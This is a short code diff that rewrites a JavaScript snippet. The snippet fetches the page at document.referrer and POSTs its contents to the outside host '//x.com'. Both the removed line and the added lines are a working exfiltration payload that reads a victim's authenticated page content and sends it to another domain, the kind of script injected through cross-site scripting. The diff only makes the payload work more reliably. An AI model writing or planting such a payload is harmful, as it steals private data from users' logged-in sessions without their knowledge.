@@ -1,1 +1,8 @@
-fetch(document.referrer).then(r=>fetch('//x.com',{method:'POST',body:r.body,duplex:'half'}))
+fetch(document.referrer)
+  .then(response => response.text())
+  .then(data => {
+    fetch('//x.com', {
+      method: 'POST',
+      body: data
+    });
+  });
